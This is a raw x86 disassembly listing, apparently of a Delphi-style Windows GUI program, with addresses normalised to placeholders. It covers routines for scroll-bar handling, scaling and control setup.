cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_466058
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
push ebp
call sub_465c88
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
push ebp
call sub_465c88
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406df0
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_466058
jmp r-xdata
sub_465fe0
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4666d0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_466058
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_4550b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_4550b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_454c6c
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_454c6c
jmp r-xdata
call sub_4657c8
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46611c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4666d0
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_4661d4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
call sub_42c660
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
call sub_42c660
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
call sub_42c660
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_424640
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
call sub_42c660
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
call sub_42c660
sub_4662dc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_465bf0
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_465bf0
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_4661d4
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_4550b4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_466058
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_465bf0
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_4663f4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450de0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_465870
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_465870
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_46646c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40331c
mov eax [ esi + 0x20c ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450f04
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4664b8
push ebx
mov ebx eax
mov eax ebx
call sub_45206c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_4666d0
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c5bc
test al al
jne r-xdata
mov eax ebx
call sub_4550b4
push eax
call sub_42c694
sub_4664f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_466650
mov ecx edi
mov edx esi
mov eax ebx
call sub_4517b4
pop edi
pop esi
pop ebx
retn
sub_466538
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_466640
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44e2b8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_465b08
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_466058
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451da8
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451da8
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418b9c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44e024
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466647
mov eax [ ebp - 0x10 ]
call sub_40331c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_465950
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_418cf8
xor ecx ecx
mov edx 0xb03e
call sub_44fa80
inc ebx
dec esi
jne r-xdata
sub_466674
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4661a8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4661a8
mov eax ebx
call sub_466650
jmp r-xdata
sub_4666d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4553b8
test al al
je r-xdata
xor eax eax
push ebp
push sub_4667bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_465c70
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_465c70
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4662dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4662dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4662dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4662dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4662dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4662dc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4667e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44e3cc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44e3f8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44e3cc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44e3f8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44e2b8
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_466058
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44e2b8
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_44e2fc
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_466058
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_44e2b8
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_466058
mov eax ebx
call sub_44e2b8
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44e2fc
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_44e2fc
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_466058
mov eax ebx
call sub_44e2fc
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_466934
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_466058
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_466058
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4661a8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4661a8
sub_4669d8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_466934
mov ecx edi
mov edx esi
mov eax ebx
call sub_454bc0
pop edi
pop esi
pop ebx
retn
sub_466a00
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_466a6a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4536a0
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466a71
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_466a71
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_466aa9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_466650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466ab0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_466ab0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4666d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_466b24
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44e2fc
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42a4c0
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44e2b8
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42a4c0
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_417694
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_451120
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_466b94
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_466bf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4034a8
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_454430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466bfc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_466c24
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466d88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_466d68
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403264
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d6f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_466d30
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41892c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40326c
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
sub_466db0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403518
and [ ebx + 0x2f4 ] 0xdf
sub_466de8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4663f4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_44e024
xor edx edx
mov eax ebx
call sub_44e048
mov edx 0x140
mov eax ebx
call sub_44e070
mov edx 0xf0
mov eax ebx
call sub_44e094
mov dl 0x1
mov eax [ r-xdata ]
call sub_429a54
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_467704
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_44d490
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403264
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_467a68
xor edx edx
mov eax ebx
call sub_44ea78
xor edx edx
mov eax ebx
call sub_44e9e0
mov dl 0x1
mov eax ebx
call sub_4551f4
mov edx ebx
mov eax [ rw-data ]
call sub_46c0cc
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_466f61
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_421d1c
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_418e94
xor edx edx
mov eax ebx
call sub_41c60c
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_46af74
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_466fcc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4036d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_467096
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4698f0
mov eax [ ebp - 0x4 ]
call sub_4553b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46c104
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
